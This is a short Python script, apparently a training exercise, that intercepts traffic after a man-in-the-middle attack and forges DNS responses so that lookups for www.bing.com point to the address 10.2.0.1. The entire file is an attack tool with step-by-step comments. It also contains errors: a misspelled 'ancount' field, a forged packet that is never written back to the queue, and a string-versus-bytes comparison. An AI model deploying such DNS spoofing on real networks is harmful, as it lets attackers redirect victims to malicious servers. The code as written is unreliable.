
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #this module let us convert the packet into scapy Packet and payload let us read the packet.
    if scapy_packet.haslayer(scapy.DNSRR):       # to check the dns layer
        qname = scapy_packet[scapy.DNSQR].qname  # to check qname field in dns layer
        if "www.bing.com" in qname:              #if statement to check if user typed bing in qname field
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname = qname, rdata = "10.2.0.1")  #spoofed the rdata and rrname
            scapy_packet[scapy.DNS].an = answer             # stored answer value to "an" field
            scapy_packet[scapy.DNS].account = 1

            del scapy_packet[scapy.IP].len    #to delete the "len" field in IP layer
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum #to delete the "chksum" field in UDP layer


    packet.accept()



queue = netfilterqueue.NetfilterQueue() #making a queue table to store the packets recieved after being MITM
queue.bind(0, process_packet)
queue.run()
